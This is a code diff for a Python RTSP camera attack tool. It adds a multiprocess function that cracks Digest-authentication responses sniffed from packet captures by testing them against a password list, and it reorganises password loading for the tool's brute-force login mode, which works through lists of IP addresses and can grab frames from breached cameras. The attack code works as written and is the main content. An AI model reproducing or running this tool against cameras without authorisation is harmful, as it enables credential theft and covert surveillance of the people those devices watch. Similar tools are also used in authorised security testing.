@@ -31,8 +31,8 @@ def get_arguments(*args):
     return parser.parse_args()[0]
 
 lock = Lock()
-
 threads_number = cpu_count()
+
 verbose = True
 capture_frame = False
 
@@ -40,6 +40,17 @@ def calculateDigestResponse(username, password, realm, method, uri, nonce):
     hash_1 = md5(f"{username}:{realm}:{password}".encode()).hexdigest()
     hash_2 = md5(f"{method}:{uri}".encode()).hexdigest()
     return md5(f"{hash_1}:{nonce}:{hash_2}".encode()).hexdigest()
+def calculateDigestResponse_Handler(details):
+    cracked_authorizations = []
+    for ip, username, realm, method, uri, nonce, response in details:
+        for password in arguments.password:
+            calculated_response = calculateDigestResponse(username, password, realm, method, uri, nonce)
+            if calculated_response == response:
+                cracked_authorizations.append({"ip": ip, "user": username, "password": password})
+                with lock:
+                    display('+', f"{Back.BLUE}{username}{Back.RESET}:{Back.CYAN}{password}{Back.RESET}@{Back.MAGENTA}{ip}{Back.RESET} => Cracked")
+                break
+    return cracked_authorizations
 def loginRTSP(ip, user, password):
     user = quote(user)
     password = quote(password)
@@ -66,7 +77,7 @@ def loginHandler(details, verbose=False):
             with lock:
                 group_successful_logins.append(detail)
                 if verbose:
-                    display('+', f"{Back.BLUE}{detail['user']}{Back.RESET}:{Back.CYAN}{detail['password']}{Back.RESET}@{Back.MAGENTA} {detail['ip']}{Back.RESET} => Access Granted")
+                    display('+', f"{Back.BLUE}{detail['user']}{Back.RESET}:{Back.CYAN}{detail['password']}{Back.RESET}@{Back.MAGENTA}{detail['ip']}{Back.RESET} => Access Granted")
                 else:
                     print(f"{Back.RESET}", end='')
     return group_successful_logins
@@ -74,12 +85,31 @@ def loginHandler(details, verbose=False):
 if __name__ == "__main__":
     arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
                               ('-C', "--capture-file", "capture_file", "Packet Capture Files (Seperated by ',')"),
-                              ('-D', "--capture-file-data", "capture_file_data", f"Dump Data Extracted from Capture File in Pickle Format (Optional)"),
+                              ('-D', "--capture-file-data", "capture_file_data", "Dump Data Extracted from Capture File in Pickle Format (Optional)"),
                               ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
                               ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                               ('-c', "--capture", "capture", f"Capture Frame if Successful Login (True/False, Default={capture_frame})"),
                               ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
+    if not arguments.write:
+        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
+    if not arguments.password:
+        display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
+        display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
+        arguments.password = ['']
+    else:
+        try:
+            with open(arguments.password, 'rb') as file:
+                display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
+                arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
+                display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
+        except FileNotFoundError:
+            arguments.password = [password for password in arguments.password.split(',')]
+        except OSError:
+            arguments.password = [password for password in arguments.password.split(',')]
+        except:
+            display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
+            exit(0)
     if not arguments.ip and not arguments.capture_file:
         display('-', "Please Provide a List of IP Addresses")
         exit(0)
@@ -130,7 +160,9 @@ if __name__ == "__main__":
                 display('-', f"Error Occured while reading Packet Capture File {Back.MAGENTA}{packet_capture_file}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
             del rtsp_authentications
             rtsp_devices = list(rtsp_devices.values())
+            successful_logins = []
             for rtsp_device in rtsp_devices:
+                print(Fore.CYAN + '-'*100 + Fore.RESET)
                 display('*', f"RTSP Device => {Back.MAGENTA}{rtsp_device['device']}{Back.RESET}")
                 display('*', f"RTSP Client => {Back.MAGENTA}{rtsp_device['source']}{Back.RESET}")
                 display('*', f"RTSP Device Port => {Back.MAGENTA}{rtsp_device['device_port']}{Back.RESET}")
@@ -146,10 +178,22 @@ if __name__ == "__main__":
                 else:
                     display(':', f"\t* Username = {Back.MAGENTA}{rtsp_device['username']}{Back.RESET}")
                     display(':', f"\t* Password = {Back.MAGENTA}{rtsp_device['password']}{Back.RESET}")
-                if arguments.capture_file_data:
-                    with open(arguments.capture_file_data, 'wb') as file:
-                        dump(rtsp_devices, file)
-            exit(0)
+                    successful_logins.append({"ip": rtsp_device["device"], "user": rtsp_device["username"], "password": rtsp_device["password"]})
+                print(Fore.CYAN + '-'*100 + Fore.RESET)
+            if arguments.capture_file_data:
+                with open(arguments.capture_file_data, 'wb') as file:
+                    dump(rtsp_devices, file)
+            pool = Pool(threads_number)
+            threads = []
+            rtsp_devices = [[rtsp_device["device"], rtsp_device["username"], rtsp_device["realm"], rtsp_device["method"], rtsp_device["uri"], rtsp_device["nonce"], rtsp_device["response"].strip()] for rtsp_device in rtsp_devices if rtsp_device["authorization"] == "DIGEST"]
+            total_rtsp_devices = len(rtsp_devices)
+            rtsp_devices_divisions = [rtsp_devices[index*total_rtsp_devices//threads_number: (index+1)*total_rtsp_devices//threads_number] for index in range(threads_number)]
+            for index, rtsp_devices_division in enumerate(rtsp_devices_divisions):
+                threads.append(pool.apply_async(calculateDigestResponse_Handler, (rtsp_devices_division, )))
+            for thread in threads:
+                successful_logins.extend(thread.get())
+            pool.close()
+            pool.join()
     else:
         ips = []
         for ip_detail in arguments.ip.split(','):
@@ -181,23 +225,6 @@ if __name__ == "__main__":
             except:
                 display('-', f"Error Loading Users from File {Back.YELLOW}{arguments.user}{Back.RESET}")
                 exit(0)
-        if not arguments.password:
-            display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
-            display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
-            arguments.password = ['']
-        else:
-            try:
-                with open(arguments.password, 'rb') as file:
-                    display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
-                    arguments.password = [password for password in file.read().decode(errors="ignore").split('\n')]
-                    display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
-            except FileNotFoundError:
-                arguments.password = [password for password in arguments.password.split(',')]
-            except OSError:
-                arguments.password = [password for password in arguments.password.split(',')]
-            except:
-                display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
-                exit(0)
         arguments.threads = threads_number
         pool = Pool(arguments.threads)
         if arguments.verbose == "False":
@@ -209,8 +236,6 @@ if __name__ == "__main__":
             frames_folder = cwd / "frames"
             frames_folder.mkdir(exist_ok=True)
             capture_frame = True
-        if not arguments.write:
-            arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
         details = []
         for user in arguments.user:
             for password in arguments.password:
